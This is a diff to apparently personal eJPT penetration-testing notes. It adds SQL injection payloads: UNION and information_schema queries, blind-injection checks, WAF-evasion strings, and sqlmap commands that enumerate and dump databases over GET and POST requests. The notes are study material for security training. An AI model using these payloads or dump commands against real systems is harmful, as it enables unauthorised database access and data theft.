@@ -83,14 +83,37 @@ To automate the process, use the following tools
 -     SELECT "You are in ..." where id='2' and 'a'='a';
 - Time-Based SQL INJECTION
 -     ?id=2' and sleep(5) --+
-- queries you man use
+- queries you may use
 -     SELECT username,password from accounts where name='admin' limit 0,1;
 -     username=' UNION SELECT 'nurhodelta','password','c','d','f','a','a' -- &password=password&login=
+-     username=' UNION SELECT 1,2,group_concat(table_name) from information_schema.tables
 - find the total number of vuln columns
 -     ?id=2' order by n --+
 -     ?id=2' union select 1,2,3,4,n-1 --+
 -     ?id=2' union select 1,version(),database(),user() --+
-- 
+- return data in blind SQL injection
+-     select substring('RAMAN',1,1)='R'; --> True
+- Evasion Techniques
+-     https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
+-     '/*12345order*/by 7 #
+-     URL encode, hex etc...
+-     EXEC('SELE'+'CT')
+-     "UNION    SELECT"
+-     '/**/or/**/1/**/=/**/1/**/
+- try to use hack bar plugin https://github.com/PhHitachi/HackBar with Firefox version 42 this facilitate SQL injeciton
+- SQLMAP Get Request:
+-     sqlmap -u "<ULR>" -p <Injection parameter> [Options]
+-     sqlmap -u "<URL>" -p <Injection Parameter> --dbms=<DB_Type>
+-     sqlmap -u "<ULR>" --users <other options>
+-     sqlmap -u "<ULR>" -p <Injection parameter> --dbs <other options>
+-     sqlmap -u "<ULR>" -p <Injection parameter> -D <database> --tables <other options>
+-     sqlmap -u "<ULR>" -p <Injection parameter> -D <database> -T <TableName> --columns <othe options>
+-     sqlmap -u "<URL>" -p <Injection Parameter> -D <database> -T <TableName> -C <ColumnName1,ColumnName2> --dump <other options>
+- SQLMAP Post Request:
+-     sqlmap -u "<URL>" --data=<POST string from burp> -p <Injection parameter> [Options]
+-     sqlmap -u "<URL>" --data=<POST string from burp> -p <Injection parameter> --dump [Options]
+- SQLMAP using request file:
+-     sqlmap -r <request file from burp.txt> -p <Injection Parameter> [Options]
 
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
